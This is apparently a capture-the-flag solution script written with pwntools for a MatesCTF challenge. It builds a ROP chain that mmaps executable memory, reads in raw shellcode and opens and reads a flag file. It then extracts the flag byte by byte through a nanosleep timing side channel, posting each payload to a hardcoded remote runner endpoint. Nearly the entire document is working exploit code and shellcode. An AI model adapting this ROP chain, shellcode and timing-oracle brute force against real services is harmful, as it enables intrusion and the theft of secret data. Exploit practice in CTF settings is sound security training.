from pwn import *
import os, struct, time, requests


context(arch="amd64", os="linux", endian="little")
context.log_level="critical"

def save_to_file(filename, data):
      f = open(filename, "w")
      f.write(data)
      f.close()

bin_args_syscall = 0x00400341
__NR_nanosleep = 35
__NR_write = 1
__NR_mmap = 9
__NR_read = 0
bin_timespec_struct = 0x0040011d
bin_ELF_str = 0x00400001
bin_entry = 0x004003b5
bin_push_rsi_push_rdi_read = 0x00400374

# --- phase 1 ---
payload = "a"*12
payload += p64(bin_push_rsi_push_rdi_read)
# read(0, rsi, 1024)
payload += p64(1024) # rdx
payload += p64(bin_args_syscall) # rbp
payload += "P" * (100 - len(payload)) # padding to 100 char

# --- bigger ROP chain! ---
payload += "a"*52
payload += p64(bin_args_syscall) # ret
payload += p64(bin_args_syscall) # rbx
# mmap(0x900000, 4096, 7, 34)
payload += p64(__NR_mmap) # rax
payload += p64(0x900000)  # rdi
payload += p64(4096)      # rsi
payload += p64(7)         # rdx
payload += p64(34)        # r10
payload += p64(0)         # r9
payload += p64(0)         # r8

payload += p64(0x900000)  # exec shellcode
# read(0, 0x900000, 4096)
payload += p64(__NR_read) # rax
payload += p64(0x0)       # rdi
payload += p64(0x900000)  # rsi
payload += p64(4096)      # rdx
payload += p64(0)         # r10
payload += p64(0)         # r9
payload += p64(0)         # r8

payload += "P" * (100 + 1024 - len(payload)) # padding

############# PLACE THE SHELLCODE HERE ##################
shellcode = "\xc7\x04\x24\x2e\x2f\x66\x6c\xc7\x44\x24\x04\x61\x67\x41\x41\x48\x89\xe7\x80\x77\x06\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x80\x3c\x24\x61\x75\x1f\x48\x31\xc0\xb0\x08\x48\x89\x04\x24\x48\x89\x54\x24\x08\x66\x81\x74\x24\x08\xff\x0f\x48\x89\xe7\x48\x31\xf6\xb0\x23\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05"


flag="MatesCTF{why_4m_1_"
#shellcode=list(shellcode)

for i in xrange(17, 50):
    if i == 1:
        shellcode=shellcode[:54]+struct.pack("B", i)+shellcode[54:]
        shellcode=shellcode[:52]+"\x7c"+shellcode[(52+1):]
    else:
        shellcode=shellcode[:54]+struct.pack("B", i)+shellcode[(54+1):]
    for j in xrange(0x20, 0x7e):
        if i == 0:
            shellcode=shellcode[:54]+struct.pack("B", j)+shellcode[(54+1):]
        else:
            shellcode=shellcode[:55]+struct.pack("B", j)+shellcode[(55+1):]
        save_to_file("/tmp/a", payload+shellcode)
        files = {'file': open('/tmp/a','rb')}
        #        io = process("./get_binary")
        startTime = int(time.time())
        r = requests.post("http://35.200.120.165/api/runner", files=files)
        #        io.sendline(payload+shellcode)
        #        io.poll(block=True)
        endTime = int(time.time())
        t = endTime-startTime
        #        io.close()
        if t > 7:
            print "[*] Found char "+str(i)+": "+chr(j)
            flag+=chr(j)
            break
print "[*] Flag: "+flag
